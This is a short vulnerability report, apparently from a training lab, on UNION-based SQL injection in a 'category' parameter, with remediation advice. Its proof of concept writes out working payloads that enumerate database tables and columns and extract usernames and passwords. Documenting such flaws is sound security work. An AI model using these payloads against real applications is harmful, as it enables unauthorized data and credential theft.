# Vulnerability Report

## Title

SQL Injection - Retrieving Data from Other Tables

---

## Severity

Critical

---

## CWE

CWE-89

---

## OWASP

A03:2021 Injection

---

## Description

The application is vulnerable to UNION-based SQL Injection.

An attacker can enumerate database metadata, discover tables and columns, and extract sensitive information stored in backend databases.

In this lab, administrator credentials were successfully extracted from the users table.

---

## Affected Parameter

```
category
```

---

## Proof of Concept

Discover Table

```sql
' UNION SELECT table_name,NULL
FROM information_schema.tables--
```

---

Discover Columns

```sql
' UNION SELECT column_name,NULL
FROM information_schema.columns
WHERE table_name='users'--
```

---

Retrieve Credentials

```sql
' UNION SELECT username,password
FROM users--
```

---

Result

```
administrator
password
```

---

## Impact

- Database Disclosure
- Credential Theft
- Account Takeover
- Privilege Escalation
- Sensitive Information Exposure

---

## Recommendation

- Prepared Statements
- Parameterized Queries
- Stored Procedures
- ORM
- Least Privilege
- Secure Error Handling

---

## Verification

Successfully reproduced.

Status

✅ Confirmed